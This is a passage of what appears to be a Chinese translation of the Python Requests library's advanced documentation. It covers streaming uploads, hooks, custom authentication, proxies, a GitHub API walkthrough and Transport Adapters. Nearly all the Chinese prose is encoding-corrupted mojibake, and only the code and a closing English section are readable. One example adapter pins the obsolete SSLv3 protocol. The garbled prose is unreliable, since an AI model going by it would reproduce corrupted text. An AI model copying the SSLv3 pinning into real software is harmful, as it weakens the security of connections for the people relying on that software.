éœ€å…ˆæŠŠå®ƒä»¬è¯»å…¥å†…å­˜ã€‚è¦ä½¿ç”¨æµå¼ä¸Šä¼ ï¼Œä»…éœ€ä¸ºä½ çš„è¯·æ±‚ä½“æä¾›ä¸€ä¸ªç±»æ–‡ä»¶å¯¹è±¡å³å¯:\n1 2 with open(\u0026#39;massive-body\u0026#39;) as f: requests.post(\u0026#39;http://some.url/streamed\u0026#39;, data=f) å—ç¼–ç è¯·æ±‚ å¯¹äºå‡ºå»å’Œè¿›æ¥çš„è¯·æ±‚ï¼ŒRequestsä¹Ÿæ”¯æŒåˆ†å—ä¼ è¾“ç¼–ç ã€‚è¦å‘é€ä¸€ä¸ªå—ç¼–ç çš„è¯·æ±‚ï¼Œä»…éœ€ä¸ºä½ çš„è¯·æ±‚ä½“æä¾›ä¸€ä¸ªç”Ÿæˆå™¨ï¼ˆæˆ–ä»»æ„æ²¡æœ‰å…·ä½“é•¿åº¦(without a length)çš„è¿­ä»£å™¨ï¼‰:\n1 2 3 4 5 def gen(): yield \u0026#39;hi\u0026#39; yield \u0026#39;there\u0026#39; requests.post(\u0026#39;http://some.url/chunked\u0026#39;, data=gen()) POST å¤šä¸ªç¼–ç (Multipart-Encoded)æ–‡ä»¶ ä½ å¯ä»¥åœ¨ä¸€ä¸ªè¯·æ±‚ä¸­å‘é€å¤šä¸ªæ–‡ä»¶ï¼Œä¾‹å¦‚ï¼Œå‡è®¾ä½ å¸Œæœ›ä¸Šä¼ å›¾åƒæ–‡ä»¶åˆ°ä¸€ä¸ªåŒ…å«å¤šä¸ªæ–‡ä»¶å­—æ®µâ€˜imagesâ€™çš„HTMLè¡¨å•\n1 \u0026lt;input type=â€fileâ€ name=â€imagesâ€ multiple=â€trueâ€ required=â€trueâ€/\u0026gt; è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œä»…ä»…åªéœ€è¦è®¾ç½®æ–‡ä»¶åˆ°ä¸€ä¸ªåŒ…å«(form_field_name, file_info)çš„å…ƒç»„çš„åˆ—è¡¨ï¼š\n1 2 3 4 5 6 7 8 9 10 11 \u0026gt;\u0026gt;\u0026gt; url = \u0026#39;http://httpbin.org/post\u0026#39; \u0026gt;\u0026gt;\u0026gt; multiple_files = [(\u0026#39;images\u0026#39;, (\u0026#39;foo.png\u0026#39;, open(\u0026#39;foo.png\u0026#39;, \u0026#39;rb\u0026#39;), \u0026#39;image/png\u0026#39;)), (\u0026#39;images\u0026#39;, (\u0026#39;bar.png\u0026#39;, open(\u0026#39;bar.png\u0026#39;, \u0026#39;rb\u0026#39;), \u0026#39;image/png\u0026#39;))] \u0026gt;\u0026gt;\u0026gt; r = requests.post(url, files=multiple_files) \u0026gt;\u0026gt;\u0026gt; r.text { ... \u0026#39;files\u0026#39;: {\u0026#39;images\u0026#39;: \u0026#39;data:image/png;base64,iVBORw ....\u0026#39;} \u0026#39;Content-Type\u0026#39;: \u0026#39;multipart/form-data; boundary=3131623adb2043caaeb5538cc7aa0b3a\u0026#39;, ... } äº‹ä»¶æŒ‚é’© Requestsæœ‰ä¸€ä¸ªé’©å­ç³»ç»Ÿï¼Œä½ å¯ä»¥ç”¨æ¥æ“æ§éƒ¨åˆ†è¯·æ±‚è¿‡ç¨‹ï¼Œæˆ–ä¿¡å·äº‹ä»¶å¤„ç†ã€‚\nå¯ç”¨çš„é’©å­:\nresponse:\nä»ä¸€ä¸ªè¯·æ±‚äº§ç”Ÿçš„å“åº”\nä½ å¯ä»¥é€šè¿‡ä¼ é€’ä¸€ä¸ª {hook_name: callback_function} å­—å…¸ç»™ hooks è¯·æ±‚å‚æ•° ä¸ºæ¯ä¸ªè¯·æ±‚åˆ†é…ä¸€ä¸ªé’©å­å‡½æ•°:\n1 hooks=dict(response=print_url) callback_function ä¼šæ¥å—ä¸€ä¸ªæ•°æ®å—ä½œä¸ºå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚\n1 2 def print_url(r): print(r.url) è‹¥æ‰§è¡Œä½ çš„å›è°ƒå‡½æ•°æœŸé—´å‘ç”Ÿé”™è¯¯ï¼Œç³»ç»Ÿä¼šç»™å‡ºä¸€ä¸ªè­¦å‘Šã€‚\nè‹¥å›è°ƒå‡½æ•°è¿”å›ä¸€ä¸ªå€¼ï¼Œé»˜è®¤ä»¥è¯¥å€¼æ›¿æ¢ä¼ è¿›æ¥çš„æ•°æ®ã€‚è‹¥å‡½æ•°æœªè¿”å›ä»»ä½•ä¸œè¥¿ï¼Œ ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå…¶ä»–çš„å½±å“ã€‚\næˆ‘ä»¬æ¥åœ¨è¿è¡ŒæœŸé—´æ‰“å°ä¸€äº›è¯·æ±‚æ–¹æ³•çš„å‚æ•°:\n1 2 3 \u0026gt;\u0026gt;\u0026gt; requests.get(\u0026#39;http://httpbin.org\u0026#39;, hooks=dict(response=print_url)) http://httpbin.org \u0026lt;Response [200]\u0026gt; è‡ªå®šä¹‰èº«ä»½éªŒè¯ Requestså…è®¸ä½ ä½¿ç”¨è‡ªå·±æŒ‡å®šçš„èº«ä»½éªŒè¯æœºåˆ¶ã€‚\nä»»ä½•ä¼ é€’ç»™è¯·æ±‚æ–¹æ³•çš„ auth å‚æ•°çš„å¯è°ƒç”¨å¯¹è±¡ï¼Œåœ¨è¯·æ±‚å‘å‡ºä¹‹å‰éƒ½æœ‰æœºä¼šä¿®æ”¹è¯·æ±‚ã€‚\nè‡ªå®šä¹‰çš„èº«ä»½éªŒè¯æœºåˆ¶æ˜¯ä½œä¸º requests.auth.AuthBase çš„å­ç±»æ¥å®ç°çš„ï¼Œä¹Ÿéå¸¸å®¹æ˜“å®šä¹‰ã€‚\nRequestsåœ¨ requests.auth ä¸­æä¾›äº†ä¸¤ç§å¸¸è§çš„çš„èº«ä»½éªŒè¯æ–¹æ¡ˆï¼š HTTPBasicAuth å’Œ HTTPDigestAuth ã€‚\nå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªwebæœåŠ¡ï¼Œä»…åœ¨ X-Pizza å¤´è¢«è®¾ç½®ä¸ºä¸€ä¸ªå¯†ç å€¼çš„æƒ…å†µä¸‹æ‰ä¼šæœ‰å“åº”ã€‚è™½ç„¶è¿™ä¸å¤ªå¯èƒ½ï¼Œ ä½†å°±ä»¥å®ƒä¸ºä¾‹å¥½äº†\n1 2 3 4 5 6 7 8 9 10 11 12 from requests.auth import AuthBase class PizzaAuth(AuthBase): \u0026#34;\u0026#34;\u0026#34;Attaches HTTP Pizza Authentication to the given Request object.\u0026#34;\u0026#34;\u0026#34; def __init__(self, username): # setup any auth-related data here self.username = username def __call__(self, r): # modify and return the request r.headers[\u0026#39;X-Pizza\u0026#39;] = self.username return r ç„¶åå°±å¯ä»¥ä½¿ç”¨æˆ‘ä»¬çš„PizzaAuthæ¥è¿›è¡Œç½‘ç»œè¯·æ±‚:\n1 2 \u0026gt;\u0026gt;\u0026gt; requests.get(\u0026#39;http://pizzabin.org/admin\u0026#39;, auth=PizzaAuth(\u0026#39;kenneth\u0026#39;)) \u0026lt;Response [200]\u0026gt; æµå¼è¯·æ±‚ ä½¿ç”¨ requests.Response.iter_lines() ä½ å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å¯¹æµå¼APIï¼ˆä¾‹å¦‚ Twitterçš„æµå¼API ï¼‰è¿›è¡Œè¿­ä»£ã€‚ç®€å•åœ°è®¾ç½® stream ä¸º True ä¾¿å¯ä»¥ä½¿ç”¨ iter_lines() å¯¹ç›¸åº”è¿›è¡Œè¿­ä»£:\n1 2 3 4 5 6 7 8 9 10 import json import requests r = requests.get(\u0026#39;http://httpbin.org/stream/20\u0026#39;, stream=True) for line in r.iter_lines(): # filter out keep-alive new lines if line: print(json.loads(line)) ä»£ç† å¦‚æœéœ€è¦ä½¿ç”¨ä»£ç†ï¼Œä½ å¯ä»¥é€šè¿‡ä¸ºä»»æ„è¯·æ±‚æ–¹æ³•æä¾› proxies å‚æ•°æ¥é…ç½®å•ä¸ªè¯·æ±‚:\n1 2 3 4 5 6 7 8 import requests proxies = { \u0026#34;http\u0026#34;: \u0026#34;http://10.10.1.10:3128\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://10.10.1.10:1080\u0026#34;, } requests.get(\u0026#34;http://example.org\u0026#34;, proxies=proxies) ä½ ä¹Ÿå¯ä»¥é€šè¿‡ç¯å¢ƒå˜é‡ HTTP_PROXY å’Œ HTTPS_PROXY æ¥é…ç½®ä»£ç†ã€‚\n1 2 3 $ export HTTP_PROXY=\u0026#34;http://10.10.1.10:3128\u0026#34; $ export HTTPS_PROXY=\u0026#34;http://10.10.1.10:1080\u0026#34; $ python 1 2 \u0026gt;\u0026gt;\u0026gt; import requests \u0026gt;\u0026gt;\u0026gt; requests.get(\u0026#34;http://example.org\u0026#34;) è‹¥ä½ çš„ä»£ç†éœ€è¦ä½¿ç”¨HTTP Basic Authï¼Œå¯ä»¥ä½¿ç”¨ http://user:password@host/ è¯­æ³•:\n1 2 3 proxies = { \u0026#34;http\u0026#34;: \u0026#34;http://user:pass@10.10.1.10:3128/\u0026#34;, } åˆè§„æ€§ Requestsç¬¦åˆæ‰€æœ‰ç›¸å…³çš„è§„èŒƒå’ŒRFCï¼Œè¿™æ ·ä¸ä¼šä¸ºç”¨æˆ·é€ æˆä¸å¿…è¦çš„å›°éš¾ã€‚ä½†è¿™ç§å¯¹è§„èŒƒçš„è€ƒè™‘ å¯¼è‡´ä¸€äº›è¡Œä¸ºå¯¹äºä¸ç†Ÿæ‚‰ç›¸å…³è§„èŒƒçš„äººæ¥è¯´çœ‹ä¼¼æœ‰ç‚¹å¥‡æ€ªã€‚\nç¼–ç æ–¹å¼ å½“ä½ æ”¶åˆ°ä¸€ä¸ªå“åº”æ—¶ï¼ŒRequestsä¼šçŒœæµ‹å“åº”çš„ç¼–ç æ–¹å¼ï¼Œç”¨äºåœ¨ä½ è°ƒç”¨ Response.text æ–¹æ³•æ—¶ å¯¹å“åº”è¿›è¡Œè§£ç ã€‚Requestsé¦–å…ˆåœ¨HTTPå¤´éƒ¨æ£€æµ‹æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„ç¼–ç æ–¹å¼ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œåˆ™ä¼šä½¿ç”¨ charade æ¥å°è¯•çŒœæµ‹ç¼–ç æ–¹å¼ã€‚\nåªæœ‰å½“HTTPå¤´éƒ¨ä¸å­˜åœ¨æ˜ç¡®æŒ‡å®šçš„å­—ç¬¦é›†ï¼Œå¹¶ä¸” Content-Type å¤´éƒ¨å­—æ®µåŒ…å« text å€¼ä¹‹æ—¶ï¼Œ Requestsæ‰ä¸å»çŒœæµ‹ç¼–ç æ–¹å¼ã€‚\nåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ RFC 2616 æŒ‡å®šé»˜è®¤å­—ç¬¦é›† å¿…é¡»æ˜¯ ISO-8859-1 ã€‚Requestséµä»è¿™ä¸€è§„èŒƒã€‚å¦‚æœä½ éœ€è¦ä¸€ç§ä¸åŒçš„ç¼–ç æ–¹å¼ï¼Œä½ å¯ä»¥æ‰‹åŠ¨è®¾ç½® Response.encoding å±æ€§ï¼Œæˆ–ä½¿ç”¨åŸå§‹çš„ Response.content ã€‚(å¯ç»“åˆä¸Šä¸€ç¯‡å®‰è£…ä½¿ç”¨å¿«é€Ÿä¸Šæ‰‹ä¸­çš„ å“åº”å†…å®¹ å­¦ä¹ )\nHTTPè¯·æ±‚ç±»å‹(é™„åŠ ä¾‹å­) Requestsæä¾›äº†å‡ ä¹æ‰€æœ‰HTTPè¯·æ±‚ç±»å‹çš„åŠŸèƒ½ï¼šGETï¼ŒOPTIONSï¼Œ HEADï¼ŒPOSTï¼ŒPUTï¼ŒPATCHå’ŒDELETEã€‚ ä»¥ä¸‹å†…å®¹ä¸ºä½¿ç”¨Requestsä¸­çš„è¿™äº›è¯·æ±‚ç±»å‹ä»¥åŠGithub APIæä¾›äº†è¯¦ç»†ç¤ºä¾‹ã€‚\næˆ‘å°†ä»æœ€å¸¸ä½¿ç”¨çš„è¯·æ±‚ç±»å‹GETå¼€å§‹ã€‚HTTP GETæ˜¯ä¸€ä¸ªå¹‚ç­‰çš„æ–¹æ³•ï¼Œä»ç»™å®šçš„URLè¿”å›ä¸€ä¸ªèµ„æºã€‚å› è€Œï¼Œ å½“ä½ è¯•å›¾ä»ä¸€ä¸ªwebä½ç½®è·å–æ•°æ®ä¹‹æ—¶ï¼Œä½ åº”è¯¥ä½¿ç”¨è¿™ä¸ªè¯·æ±‚ç±»å‹ã€‚ä¸€ä¸ªä½¿ç”¨ç¤ºä¾‹æ˜¯å°è¯•ä»Githubä¸Šè·å– å…³äºä¸€ä¸ªç‰¹å®šcommitçš„ä¿¡æ¯ã€‚å‡è®¾æˆ‘ä»¬æƒ³è·å–Requestsçš„commit a050faf çš„ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥ è¿™æ ·å»åš:\n1 2 \u0026gt;\u0026gt;\u0026gt; import requests \u0026gt;\u0026gt;\u0026gt; r = requests.get(\u0026#39;https://api.github.com/repos/kennethreitz/requests/git/commits/a050faf084662f3a352dd1a941f2c7c9f886d4ad\u0026#39;) æˆ‘ä»¬åº”è¯¥ç¡®è®¤Githubæ˜¯å¦æ­£ç¡®å“åº”ã€‚å¦‚æœæ­£ç¡®å“åº”ï¼Œæˆ‘ä»¬æƒ³å¼„æ¸…å“åº”å†…å®¹æ˜¯ä»€ä¹ˆç±»å‹çš„ã€‚åƒè¿™æ ·å»åš:\n1 2 3 4 \u0026gt;\u0026gt;\u0026gt; if (r.status_code == requests.codes.ok): ... print r.headers[\u0026#39;content-type\u0026#39;] ... application/json; charset=utf-8 å¯è§ï¼ŒGitHubè¿”å›äº†JSONæ•°æ®ï¼Œéå¸¸å¥½ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨ r.json æ–¹æ³•æŠŠè¿™ä¸ªè¿”å›çš„æ•°æ®è§£ææˆPythonå¯¹è±¡ã€‚\n1 2 3 4 5 6 7 \u0026gt;\u0026gt;\u0026gt; commit_data = r.json() \u0026gt;\u0026gt;\u0026gt; print commit_data.keys() [u\u0026#39;committer\u0026#39;, u\u0026#39;author\u0026#39;, u\u0026#39;url\u0026#39;, u\u0026#39;tree\u0026#39;, u\u0026#39;sha\u0026#39;, u\u0026#39;parents\u0026#39;, u\u0026#39;message\u0026#39;] \u0026gt;\u0026gt;\u0026gt; print commit_data[u\u0026#39;committer\u0026#39;] {u\u0026#39;date\u0026#39;: u\u0026#39;2012-05-10T11:10:50-07:00\u0026#39;, u\u0026#39;email\u0026#39;: u\u0026#39;me@kennethreitz.com\u0026#39;, u\u0026#39;name\u0026#39;: u\u0026#39;Kenneth Reitz\u0026#39;} \u0026gt;\u0026gt;\u0026gt; print commit_data[u\u0026#39;message\u0026#39;] makin\u0026#39; history åˆ°ç›®å‰ä¸ºæ­¢ï¼Œä¸€åˆ‡éƒ½éå¸¸ç®€å•ã€‚å—¯ï¼Œæˆ‘ä»¬æ¥ç ”ç©¶ä¸€ä¸‹GitHubçš„APIã€‚æˆ‘ä»¬å¯ä»¥å»çœ‹çœ‹æ–‡æ¡£ï¼Œ ä½†å¦‚æœä½¿ç”¨Requestsæ¥ç ”ç©¶ä¹Ÿè®¸ä¼šæ›´æœ‰æ„æ€ä¸€ç‚¹ã€‚æˆ‘ä»¬å¯ä»¥å€ŸåŠ©Requestsçš„OPTIONSè¯·æ±‚ç±»å‹æ¥çœ‹çœ‹æˆ‘ä»¬åˆšä½¿ç”¨è¿‡çš„url æ”¯æŒå“ªäº›HTTPæ–¹æ³•ã€‚\n1 2 3 \u0026gt;\u0026gt;\u0026gt; verbs = requests.options(r.url) \u0026gt;\u0026gt;\u0026gt; verbs.status_code 500 é¢ï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹ï¼Ÿæ¯«æ— å¸®åŠ©å˜›ï¼åŸæ¥GitHubï¼Œä¸è®¸å¤šAPIæä¾›æ–¹ä¸€æ ·ï¼Œå®é™…ä¸Šå¹¶æœªå®ç°OPTIONSæ–¹æ³•ã€‚ è¿™æ˜¯ä¸€ä¸ªæ¼äººçš„ç–å¿½ï¼Œä½†æ²¡å…³ç³»ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¯ç‡¥çš„æ–‡æ¡£ã€‚ç„¶è€Œï¼Œå¦‚æœGitHubæ­£ç¡®å®ç°äº†OPTIONSï¼Œ é‚£ä¹ˆæœåŠ¡å™¨åº”è¯¥åœ¨å“åº”å¤´ä¸­è¿”å›å…è®¸ç”¨æˆ·ä½¿ç”¨çš„HTTPæ–¹æ³•ï¼Œä¾‹å¦‚ï¼š\n1 2 3 \u0026gt;\u0026gt;\u0026gt; verbs = requests.options(\u0026#39;http://a-good-website.com/api/cats\u0026#39;) \u0026gt;\u0026gt;\u0026gt; print verbs.headers[\u0026#39;allow\u0026#39;] GET,HEAD,POST,OPTIONS è½¬è€Œå»æŸ¥çœ‹æ–‡æ¡£ï¼Œæˆ‘ä»¬çœ‹åˆ°å¯¹äºæäº¤ä¿¡æ¯ï¼Œå¦ä¸€ä¸ªå…è®¸çš„æ–¹æ³•æ˜¯POSTï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æäº¤ã€‚ ç”±äºæˆ‘ä»¬æ­£åœ¨ä½¿ç”¨Requestsä»£ç åº“ï¼Œæˆ‘ä»¬åº”å°½å¯èƒ½é¿å…å¯¹å®ƒå‘é€ç¬¨æ‹™çš„POSTã€‚ä½œä¸ºæ›¿ä»£ï¼Œæˆ‘ä»¬æ¥ ç©ç©GitHubçš„Issueç‰¹æ€§ã€‚\næœ¬ç¯‡æ–‡æ¡£æ˜¯å›åº”Issue #482è€Œæ·»åŠ çš„ã€‚é‰´äºè¯¥é—®é¢˜å·²ç»å­˜åœ¨ï¼Œæˆ‘ä»¬å°±ä»¥å®ƒä¸ºä¾‹ã€‚å…ˆè·å–å®ƒã€‚\n1 2 3 4 5 6 7 8 \u0026gt;\u0026gt;\u0026gt; r = requests.get(\u0026#39;https://api.github.com/repos/kennethreitz/requests/issues/482\u0026#39;) \u0026gt;\u0026gt;\u0026gt; r.status_code 200 \u0026gt;\u0026gt;\u0026gt; issue = json.loads(r.text) \u0026gt;\u0026gt;\u0026gt; print issue[u\u0026#39;title\u0026#39;] Feature any http verb in docs \u0026gt;\u0026gt;\u0026gt; print issue[u\u0026#39;comments\u0026#39;] 3 Coolï¼Œæœ‰3ä¸ªè¯„è®ºã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æœ€åä¸€ä¸ªè¯„è®ºã€‚\n1 2 3 4 5 6 7 8 \u0026gt;\u0026gt;\u0026gt; r = requests.get(r.url + u\u0026#39;/comments\u0026#39;) \u0026gt;\u0026gt;\u0026gt; r.status_code 200 \u0026gt;\u0026gt;\u0026gt; comments = r.json() \u0026gt;\u0026gt;\u0026gt; print comments[0].keys() [u\u0026#39;body\u0026#39;, u\u0026#39;url\u0026#39;, u\u0026#39;created_at\u0026#39;, u\u0026#39;updated_at\u0026#39;, u\u0026#39;user\u0026#39;, u\u0026#39;id\u0026#39;] \u0026gt;\u0026gt;\u0026gt; print comments[2][u\u0026#39;body\u0026#39;] Probably in the \u0026#34;advanced\u0026#34; section å—¯ï¼Œé‚£çœ‹èµ·æ¥ä¼¼ä¹æ˜¯ä¸ªæ„šè ¢ä¹‹å¤„ã€‚æˆ‘ä»¬å‘è¡¨ä¸ªè¯„è®ºæ¥å‘Šè¯‰è¿™ä¸ªè¯„è®ºè€…ä»–è‡ªå·±çš„æ„šè ¢ã€‚é‚£ä¹ˆï¼Œè¿™ä¸ªè¯„è®ºè€…æ˜¯è°å‘¢ï¼Ÿ\n1 2 \u0026gt;\u0026gt;\u0026gt; print comments[2][u\u0026#39;user\u0026#39;][u\u0026#39;login\u0026#39;] kennethreitz å¥½ï¼Œæˆ‘ä»¬æ¥å‘Šè¯‰è¿™ä¸ªå«è‚¯å°¼æ€çš„å®¶ä¼™ï¼Œè¿™ä¸ªä¾‹å­åº”è¯¥æ”¾åœ¨å¿«é€Ÿä¸Šæ‰‹æŒ‡å—ä¸­ã€‚æ ¹æ®GitHub APIæ–‡æ¡£ï¼Œ å…¶æ–¹æ³•æ˜¯POSTåˆ°è¯¥è¯é¢˜ã€‚æˆ‘ä»¬æ¥è¯•è¯•çœ‹ã€‚\n1 2 3 4 5 \u0026gt;\u0026gt;\u0026gt; body = json.dumps({u\u0026#34;body\u0026#34;: u\u0026#34;Sounds great! I\u0026#39;ll get right on it!\u0026#34;}) \u0026gt;\u0026gt;\u0026gt; url = u\u0026#34;https://api.github.com/repos/kennethreitz/requests/issues/482/comments\u0026#34; \u0026gt;\u0026gt;\u0026gt; r = requests.post(url=url, data=body) \u0026gt;\u0026gt;\u0026gt; r.status_code 404 é¢ï¼Œè¿™æœ‰ç‚¹å¤æ€ªå“ˆã€‚å¯èƒ½æˆ‘ä»¬éœ€è¦éªŒè¯èº«ä»½ã€‚é‚£å°±æœ‰ç‚¹çº ç»“äº†ï¼Œå¯¹å§ï¼Ÿä¸å¯¹ã€‚Requestsç®€åŒ–äº†å¤šç§èº«ä»½éªŒè¯å½¢å¼çš„ä½¿ç”¨ï¼Œ åŒ…æ‹¬éå¸¸å¸¸è§çš„Basic Authã€‚\n1 2 3 4 5 6 7 8 \u0026gt;\u0026gt;\u0026gt; from requests.auth import HTTPBasicAuth \u0026gt;\u0026gt;\u0026gt; auth = HTTPBasicAuth(\u0026#39;fake@example.com\u0026#39;, \u0026#39;not_a_real_password\u0026#39;) \u0026gt;\u0026gt;\u0026gt; r = requests.post(url=url, data=body, auth=auth) \u0026gt;\u0026gt;\u0026gt; r.status_code 201 \u0026gt;\u0026gt;\u0026gt; content = r.json() \u0026gt;\u0026gt;\u0026gt; print(content[u\u0026#39;body\u0026#39;]) Sounds great! I\u0026#39;ll get right on it. ç²¾å½©ï¼å™¢ï¼Œä¸ï¼æˆ‘åŸæœ¬æ˜¯æƒ³è¯´ç­‰æˆ‘ä¸€ä¼šï¼Œå› ä¸ºæˆ‘å¾—å»å–‚ä¸€ä¸‹æˆ‘çš„çŒ«ã€‚å¦‚æœæˆ‘èƒ½å¤Ÿç¼–è¾‘è¿™æ¡è¯„è®ºé‚£å°±å¥½äº†ï¼ å¹¸è¿çš„æ˜¯ï¼ŒGitHubå…è®¸æˆ‘ä»¬ä½¿ç”¨å¦ä¸€ä¸ªHTTPåŠ¨è¯ï¼ŒPATCHï¼Œæ¥ç¼–è¾‘è¯„è®ºã€‚æˆ‘ä»¬æ¥è¯•è¯•ã€‚\n1 2 3 4 5 6 7 \u0026gt;\u0026gt;\u0026gt; print(content[u\u0026#34;id\u0026#34;]) 5804413 \u0026gt;\u0026gt;\u0026gt; body = json.dumps({u\u0026#34;body\u0026#34;: u\u0026#34;Sounds great! I\u0026#39;ll get right on it once I feed my cat.\u0026#34;}) \u0026gt;\u0026gt;\u0026gt; url = u\u0026#34;https://api.github.com/repos/kennethreitz/requests/issues/comments/5804413\u0026#34; \u0026gt;\u0026gt;\u0026gt; r = requests.patch(url=url, data=body, auth=auth) \u0026gt;\u0026gt;\u0026gt; r.status_code 200 éå¸¸å¥½ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬æ¥æŠ˜ç£¨ä¸€ä¸‹è¿™ä¸ªå«è‚¯å°¼æ€çš„å®¶ä¼™ï¼Œæˆ‘å†³å®šè¦è®©ä»–æ€¥å¾—å›¢å›¢è½¬ï¼Œä¹Ÿä¸å‘Šè¯‰ä»–æ˜¯æˆ‘åœ¨æ£è›‹ã€‚ è¿™æ„å‘³ç€æˆ‘æƒ³åˆ é™¤è¿™æ¡è¯„è®ºã€‚GitHubå…è®¸æˆ‘ä»¬ä½¿ç”¨å®Œå…¨åå‰¯å…¶å®çš„DELETEæ–¹æ³•æ¥åˆ é™¤è¯„è®ºã€‚æˆ‘ä»¬æ¥æ¸…é™¤è¯¥è¯„è®ºã€‚\n1 2 3 4 5 \u0026gt;\u0026gt;\u0026gt; r = requests.delete(url=url, auth=auth) \u0026gt;\u0026gt;\u0026gt; r.status_code 204 \u0026gt;\u0026gt;\u0026gt; r.headers[\u0026#39;status\u0026#39;] \u0026#39;204 No Content\u0026#39; å¾ˆå¥½ã€‚ä¸è§äº†ã€‚æœ€åä¸€ä»¶æˆ‘æƒ³çŸ¥é“çš„äº‹æƒ…æ˜¯æˆ‘å·²ç»ä½¿ç”¨äº†å¤šå°‘é™é¢ï¼ˆratelimitï¼‰ã€‚æŸ¥æŸ¥çœ‹ï¼ŒGitHubåœ¨å“åº”å¤´éƒ¨å‘é€è¿™ä¸ªä¿¡æ¯ï¼Œ å› æ­¤ä¸å¿…ä¸‹è½½æ•´ä¸ªç½‘é¡µï¼Œæˆ‘å°†ä½¿ç”¨ä¸€ä¸ªHEADè¯·æ±‚æ¥è·å–å“åº”å¤´ã€‚\n1 2 3 4 5 6 \u0026gt;\u0026gt;\u0026gt; r = requests.head(url=url, auth=auth) \u0026gt;\u0026gt;\u0026gt; print r.headers ... \u0026#39;x-ratelimit-remaining\u0026#39;: \u0026#39;4995\u0026#39; \u0026#39;x-ratelimit-limit\u0026#39;: \u0026#39;5000\u0026#39; ... å¾ˆå¥½ã€‚æ˜¯æ—¶å€™å†™ä¸ªPythonç¨‹åºä»¥å„ç§åˆºæ¿€çš„æ–¹å¼æ»¥ç”¨GitHubçš„APIï¼Œè¿˜å¯ä»¥ä½¿ç”¨4995æ¬¡å‘¢ã€‚\nå“åº”å¤´é“¾æ¥å­—æ®µ è®¸å¤šHTTP APIéƒ½æœ‰å“åº”å¤´é“¾æ¥å­—æ®µçš„ç‰¹æ€§ï¼Œå®ƒä»¬ä½¿å¾—APIèƒ½å¤Ÿæ›´å¥½åœ°è‡ªæˆ‘æè¿°å’Œè‡ªæˆ‘æ˜¾éœ²ã€‚\nGitHubåœ¨APIä¸­ä¸º åˆ†é¡µ ä½¿ç”¨è¿™äº›ç‰¹æ€§ï¼Œä¾‹å¦‚:\n1 2 3 4 \u0026gt;\u0026gt;\u0026gt; url = \u0026#39;https://api.github.com/users/kennethreitz/repos?page=1\u0026amp;per_page=10\u0026#39; \u0026gt;\u0026gt;\u0026gt; r = requests.head(url=url) \u0026gt;\u0026gt;\u0026gt; r.headers[\u0026#39;link\u0026#39;] \u0026#39;\u0026lt;https://api.github.com/users/kennethreitz/repos?page=2\u0026amp;per_page=10\u0026gt;; rel=\u0026#34;next\u0026#34;, \u0026lt;https://api.github.com/users/kennethreitz/repos?page=6\u0026amp;per_page=10\u0026gt;; rel=\u0026#34;last\u0026#34;\u0026#39; Requestsä¼šè‡ªåŠ¨è§£æè¿™äº›å“åº”å¤´é“¾æ¥å­—æ®µï¼Œå¹¶ä½¿å¾—å®ƒä»¬éå¸¸æ˜“äºä½¿ç”¨:\n1 2 3 4 5 \u0026gt;\u0026gt;\u0026gt; r.links[\u0026#34;next\u0026#34;] {\u0026#39;url\u0026#39;: \u0026#39;https://api.github.com/users/kennethreitz/repos?page=2\u0026amp;per_page=10\u0026#39;, \u0026#39;rel\u0026#39;: \u0026#39;next\u0026#39;} \u0026gt;\u0026gt;\u0026gt; r.links[\u0026#34;last\u0026#34;] {\u0026#39;url\u0026#39;: \u0026#39;https://api.github.com/users/kennethreitz/repos?page=7\u0026amp;per_page=10\u0026#39;, \u0026#39;rel\u0026#39;: \u0026#39;last\u0026#39;} Transport Adapters As of v1.0.0, Requests has moved to a modular internal design. Part of the reason this was done was to implement Transport Adapters, originally described here. Transport Adapters provide a mechanism to define interaction methods for an HTTP service. In particular, they allow you to apply per-service configuration.\nRequests ships with a single Transport Adapter, the HTTPAdapter. This adapter provides the default Requests interaction with HTTP and HTTPS using the powerful urllib3 library. Whenever a Requests Session is initialized, one of these is attached to the Session object for HTTP, and one for HTTPS.\nRequests enables users to create and use their own Transport Adapters that provide specific functionality. Once created, a Transport Adapter can be mounted to a Session object, along with an indication of which web services it should apply to.\n1 2 \u0026gt;\u0026gt;\u0026gt; s = requests.Session() \u0026gt;\u0026gt;\u0026gt; s.mount(\u0026#39;http://www.github.com\u0026#39;, MyAdapter()) The mount call registers a specific instance of a Transport Adapter to a prefix. Once mounted, any HTTP request made using that session whose URL starts with the given prefix will use the given Transport Adapter.\nMany of the details of implementing a Transport Adapter are beyond the scope of this documentation, but take a look at the next example for a simple SSL use- case. For more than that, you might look at subclassing requests.adapters.BaseAdapter.\nExample: Specific SSL Version The Requests team has made a specific choice to use whatever SSL version is default in the underlying library (urllib3). Normally this is fine, but from time to time, you might find yourself needing to connect to a service-endpoint that uses a version that isnâ€™t compatible with the default.\nYou can use Transport Adapters for this by taking most of the existing implementation of HTTPAdapter, and adding a parameter ssl_version that gets passed-through to urllib3. Weâ€™ll make a TA that instructs the library to use SSLv3:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import ssl from requests.adapters import HTTPAdapter from requests.packages.urllib3.poolmanager import PoolManager class Ssl3HttpAdapter(HTTPAdapter): \u0026#34;\u0026#34;\u0026#34;\u0026#34;Transport adapter\u0026#34; that allows us to use SSLv3.\u0026#34;\u0026#34;\u0026#34; def init_poolmanager(self, connections, maxsize, block=False): self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize, block=block, ssl_version=ssl.PROTOCOL_SSLv3) Blocking Or Non-Blocking? With the default Transport Adapter in place, Requests does not provide any kind of non-blocking IO. The Response.content property will block until the entire response has been downloaded. If you require more granularity, the streaming features of the library (see æµå¼è¯·æ±‚) allow you to retrieve smaller quantities of the response at a time. However, these calls will still block.\nIf you are concerned about the use of blocking IO, 